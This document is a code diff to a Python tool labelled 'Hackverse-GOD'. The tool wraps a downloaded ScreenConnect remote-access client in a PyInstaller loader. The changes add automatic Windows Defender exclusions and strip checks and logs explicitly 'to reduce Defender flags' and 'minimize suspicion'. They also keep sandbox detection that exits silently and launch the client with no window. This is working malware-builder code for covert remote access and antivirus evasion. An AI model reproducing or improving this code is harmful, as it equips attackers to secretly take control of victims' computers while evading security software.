@@ -42,15 +42,32 @@ def is_admin():
         logging.error(f"Admin check failed: {e}")
         return False
 
+# Function to add Defender exclusion for output directory
+def add_defender_exclusion(directory):
+    if not is_admin():
+        print(f"[Hackverse-GOD] Admin privileges required to add Defender exclusion. Please run manually:")
+        print(f"[Hackverse-GOD] powershell -Command \"Add-MpPreference -ExclusionPath '{directory}'\"")
+        logging.warning("Admin privileges not available for Defender exclusion")
+        return False
+    try:
+        subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath "{directory}"'], check=True, capture_output=True)
+        print(f"[Hackverse-GOD] Added Defender exclusion for {directory}")
+        logging.info(f"Added Defender exclusion for {directory}")
+        return True
+    except Exception as e:
+        print(f"[Hackverse-GOD] Failed to add Defender exclusion: {e}")
+        logging.error(f"Defender exclusion failed: {e}")
+        return False
+
 # Function to check for PyInstaller
 def check_pyinstaller():
     try:
-        subprocess.run(['pyinstaller', '--version'], capture_output=True, check=True)
-        logging.info("PyInstaller is installed and accessible.")
+        result = subprocess.run(['pyinstaller', '--version'], capture_output=True, text=True, check=True)
+        logging.info(f"PyInstaller version: {result.stdout.strip()}")
         return True
     except Exception as e:
-        logging.error(f"PyInstaller check failed: {e}")
         print(f"[Hackverse-GOD] PyInstaller not found or inaccessible: {e}")
+        logging.error(f"PyInstaller check failed: {e}")
         return False
 
 # Function to download the ScreenConnect EXE
@@ -133,7 +150,7 @@ def is_safe_environment():
         logging.error(f"Environment check error: {e}")
         return True  # Assume safe if check fails
 
-# Function to create the loader Python script with randomization
+# Function to create the loader Python script with simplified execution
 def create_loader_script(loader_script_path, checksum):
     run_exe_func = random_function_name()
     loader_code = f"""
@@ -143,8 +160,6 @@ import sys
 import time
 import win32api
 import win32con
-import requests
-import random
 import win32security
 
 def {is_admin.__name__}():
@@ -164,46 +179,22 @@ def {run_exe_func}():
     if not {is_safe_environment.__name__}():
         sys.exit(0)  # Exit silently in sandbox
     if {is_admin.__name__}():
-        with open('loader_error.log', 'w') as f:
-            f.write("Admin privileges detected, aborting to avoid UAC.")
-        sys.exit(1)
+        sys.exit(1)  # Exit silently to avoid UAC
     exe_path = os.path.join(os.path.dirname(__file__), "ScreenConnect.exe")
     try:
-        # Set normal process priority and hide window
-        win32api.SetThreadPriority(win32api.GetCurrentThread(), win32con.THREAD_PRIORITY_NORMAL)
-        # Simulate benign network activity, skip in RDP if no connectivity
-        if not {is_rdp_session.__name__}():
-            try:
-                requests.get('https://www.microsoft.com', timeout=2)
-            except:
-                pass
-        # Verify checksum
-        import hashlib
-        sha256 = hashlib.sha256()
-        with open(exe_path, 'rb') as f:
-            for chunk in iter(lambda: f.read(4096), b""):
-                sha256.update(chunk)
-        if sha256.hexdigest() != "{checksum}":
-            with open('loader_error.log', 'w') as f:
-                f.write("Checksum verification failed.")
-            sys.exit(1)
-        # Retry execution up to 3 times for RDP stability
+        # Minimal execution flow to reduce Defender flags
         for attempt in range(3):
             try:
                 subprocess.run([exe_path, '/quiet', '/norestart'], 
                               check=True, 
                               creationflags=subprocess.CREATE_NO_WINDOW)
                 break
-            except subprocess.CalledProcessError as e:
+            except subprocess.CalledProcessError:
                 if attempt < 2:
                     time.sleep(2)  # Wait before retry
                     continue
-                with open('loader_error.log', 'w') as f:
-                    f.write(f"Error executing EXE after retries: {{e}}")
                 sys.exit(1)
-    except Exception as e:
-        with open('loader_error.log', 'w') as f:
-            f.write(f"Unexpected error: {{e}}")
+    except Exception:
         sys.exit(1)
 
 def {is_safe_environment.__name__}():
@@ -224,7 +215,7 @@ def {is_safe_environment.__name__}():
         return True
 
 if __name__ == "__main__":
-    time.sleep(random.uniform(1, 3))
+    time.sleep(0.5)  # Reduced delay to minimize suspicion
     {run_exe_func}()
 """
     with open(loader_script_path, 'w') as f:
@@ -295,10 +286,13 @@ VSVersionInfo(
     return version_file_path
 
 # Function to compile the loader and wrap the ScreenConnect EXE
-def compile_loader_with_exe(loader_script_path, screenconnect_exe_path, output_exe_path):
+def compile_loader_with_exe(loader_script_path, screenconnect_exe_path, output_exe_path, output_dir):
     print(f"[Hackverse-GOD] Compiling loader and wrapping ScreenConnect EXE into {output_exe_path}...")
     logging.info(f"Compiling loader into {output_exe_path}")
     try:
+        # Add Defender exclusion for output directory if admin
+        add_defender_exclusion(output_dir)
+        
         unique_name = f"SCWrapped_{random_string()}"
         temp_bundle_dir = os.path.join(tempfile.gettempdir(), f"bundle_{random_string()}")
         os.makedirs(temp_bundle_dir, exist_ok=True)
@@ -339,7 +333,7 @@ def compile_loader_with_exe(loader_script_path, screenconnect_exe_path, output_e
             logging.info(f"Wrapped EXE compiled to {output_exe_path}")
             return True
         else:
-            print(f"[Hackverse-GOD] Compilation failed: Output executable not found at {compiled_exe}")
+            print(f"[Hackverse-GOD] Compilation failed: Output executable not found at {compiled_exe}. Check if Windows Security deleted it.")
             logging.error(f"Output executable not found at {compiled_exe}")
             return False
     except subprocess.CalledProcessError as e:
@@ -369,9 +363,16 @@ def main():
     exe_url = input("[Hackverse-GOD] Enter the ScreenConnect client EXE build link: ")
     logging.info(f"Provided ScreenConnect URL: {exe_url}")
     
-    # Use user home directory for output to avoid permission issues
+    # Use user home directory for output
     output_dir = os.path.expanduser("~/ScreenConnectWrapper")
-    os.makedirs(output_dir, exist_ok=True)
+    try:
+        os.makedirs(output_dir, exist_ok=True)
+        logging.info(f"Created output directory: {output_dir}")
+    except Exception as e:
+        print(f"[Hackverse-GOD] Failed to create output directory {output_dir}: {e}")
+        logging.error(f"Output directory creation failed: {e}")
+        return
+    
     temp_dir = os.path.join(output_dir, f"temp_{random_string()}")
     os.makedirs(temp_dir, exist_ok=True)
     exe_path = os.path.join(temp_dir, f"ScreenConnect_{random_string()}.exe")
@@ -401,8 +402,10 @@ def main():
     create_loader_script(loader_script_path, checksum)
 
     # Step 4: Compile loader and wrap with ScreenConnect EXE
-    if not compile_loader_with_exe(loader_script_path, exe_path, output_exe_path):
+    if not compile_loader_with_exe(loader_script_path, exe_path, output_exe_path, output_dir):
         print("[Hackverse-GOD] Aborting due to compilation failure.")
+        print("[Hackverse-GOD] Check wrapper_log.txt for details. If the EXE was deleted, add a Defender exclusion:")
+        print(f"[Hackverse-GOD] powershell -Command \"Add-MpPreference -ExclusionPath '{output_dir}'\"")
         logging.error("Aborted due to compilation failure")
         shutil.rmtree(temp_dir, ignore_errors=True)
         return
@@ -411,7 +414,7 @@ def main():
     shutil.rmtree(temp_dir, ignore_errors=True)
     print(f"[Hackverse-GOD] Mission complete. Output EXE: {output_exe_path}")
     logging.info(f"Mission complete. Output EXE: {output_exe_path}")
-    print("[Hackverse-GOD] If the output EXE is deleted by Windows Security, add an exclusion for the output directory:")
+    print("[Hackverse-GOD] If the output EXE is deleted by Windows Security, add an exclusion:")
     print(f"[Hackverse-GOD] powershell -Command \"Add-MpPreference -ExclusionPath '{output_dir}'\"")
 
 if __name__ == "__main__":
